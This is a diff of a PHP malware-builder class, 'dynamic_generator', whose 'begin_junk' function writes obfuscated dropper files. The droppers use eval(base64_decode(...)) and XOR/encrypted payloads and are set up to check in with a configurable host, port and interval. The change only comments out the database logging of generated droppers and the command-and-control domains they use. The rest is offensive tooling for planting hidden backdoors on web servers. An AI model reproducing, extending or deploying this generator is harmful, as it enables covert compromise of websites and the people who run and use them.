@@ -1,6 +1,5 @@
 <?php
 define('allowed_chars', "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");
-require "../db/postgres_checker.php";
 
 class dynamic_generator
 {
@@ -214,7 +213,7 @@ SLEEPER2;
 
     function begin_junk($file, $depth, $out, $mode, bool $encrypt, string $checkInHost, int $checkInPort, int $checkInDuration, $slop)
     {
-        $insertDroppers = new postgres_checker();
+//        $insertDroppers = new postgres_checker();
         $char_map_lower = array(
             "a" => "\\x61",
             "b" => "\\x62",
@@ -321,8 +320,8 @@ SLEEPER2;
                 case "n":
                     $d = "<?php\neval(base64_decode(\"" . base64_encode(implode("", $b_encoded)) . "\"));\n";
                     fputs(fopen($out, "w"), $d, strlen($d));
-                    $insertDroppers->insertCreatedDropper('no', 'no', 'no', $out, $checkInDuration, $mode, $depth);
-                    $insertDroppers->countUsedDomains($checkInHost);
+//                    postgres_checker::insertCreatedDropper('no', 'no', 'no', $out, $checkInDuration, $mode, $depth);
+//                    postgres_checker::countUsedDomains($checkInHost);
                     break;
                 case "ob":
                     $out_file = fopen($out, "w");
@@ -377,8 +376,8 @@ $fun(base64_decode("$b"));
 FULL;
                     fputs($out_file, $do, strlen($do));
                     fclose($out_file);
-                    $insertDroppers->insertCreatedDropper($xorkey, '', $eXC['key'].$eXC['IV'].$eXC['Tag'], $out_file, $checkInDuration, $mode, $depth);
-                    $insertDroppers->countUsedDomains($checkInHost);
+//                    postgres_checker::insertCreatedDropper($xorkey, '', $eXC['key'].$eXC['IV'].$eXC['Tag'], $out_file, $checkInDuration, $mode, $depth);
+//                    postgres_checker::countUsedDomains($checkInHost);
                     break;
             }
         } else {
